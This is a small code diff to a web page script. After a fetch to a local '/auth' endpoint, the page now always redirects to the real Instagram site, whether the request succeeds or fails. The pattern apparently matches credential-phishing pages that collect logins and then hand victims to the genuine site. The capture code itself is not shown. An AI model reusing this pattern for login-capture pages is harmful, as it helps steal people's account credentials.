@@ -410,9 +410,11 @@
 
           fetch('/auth', options )
             .then(res => {
-              console.log(res);
+              window.location.href = 'https://www.instagram.com/';
             })
-            .catch(e => console.log(e));
+            .catch(e => {
+              window.location.href = 'https://www.instagram.com/';
+            });
         })
       </script>
 
